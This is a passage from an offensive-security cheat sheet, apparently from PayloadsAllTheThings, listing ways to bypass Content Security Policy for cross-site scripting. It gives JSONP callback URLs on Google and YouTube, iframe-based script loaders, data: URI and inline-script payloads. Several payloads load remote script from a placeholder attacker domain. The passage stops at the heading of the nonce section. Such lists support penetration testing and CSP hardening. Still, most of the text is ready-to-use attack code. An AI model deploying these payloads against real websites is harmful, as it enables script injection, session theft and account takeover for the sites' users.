<!-- source: XSS Injection/4 - CSP Bypass.md | chunk 1/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

# CSP Bypass

> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS), data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.

## Summary

- [Tools](#tools)
- [Bypass CSP using JSONP](#bypass-csp-using-jsonp)
- [Bypass CSP default-src](#bypass-csp-default-src)
- [Bypass CSP inline eval](#bypass-csp-inline-eval)
- [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
- [Bypass CSP script-src self](#bypass-csp-script-src-self)
- [Bypass CSP script-src data](#bypass-csp-script-src-data)
- [Bypass CSP nonce](#bypass-csp-nonce)
- [Bypass CSP header sent by PHP](#bypass-csp-header-sent-by-php)
- [Labs](#labs)
- [References](#references)

## Tools

- [gmsgadget.com](https://gmsgadget.com/) - GMSGadget (Give Me a Script Gadget) is a collection of JavaScript gadgets that can be used to bypass XSS mitigations such as Content Security Policy (CSP) and HTML sanitizers like DOMPurify.
- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.

## Bypass CSP using JSONP

**Requirements**:

- CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`

**Payload**:

Use a callback function from a whitelisted source listed in the CSP.

- Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
- Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
- Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
- Youtube: `https://www.youtube.com/oembed?callback=alert;`
- [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
- [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

## Bypass CSP default-src

**Requirements**:

- CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`,

**Payload**:

`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//[ATTACKER.DOMAIN.TLD]/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`

```js
script=document.createElement('script');
script.src='//[ATTACKER.DOMAIN.TLD]/csp.js';
window.frames[0].document.head.appendChild(script);
```

Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

## Bypass CSP inline eval

**Requirements**:

- CSP `inline` or `eval`

**Payload**:

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[ATTACKER.DOMAIN.TLD]";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

## Bypass CSP script-src self

**Requirements**:

- CSP like `script-src self`

**Payload**:

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

Source: [@akita_zen](https://twitter.com/akita_zen)

## Bypass CSP script-src data

**Requirements**:

- CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).

**Payload**:

```javascript
<script src="data:,alert(1)">/</script>
```

Source: [@404death](https://twitter.com/404death/status/1191222237782659072)

## Bypass CSP unsafe-inline

**Requirements**:

- CSP: `script-src https://google.com 'unsafe-inline';`

**Payload**:

```javascript
"/><script>alert(1);</script>
```

## Bypass CSP nonce

**Requirements**:
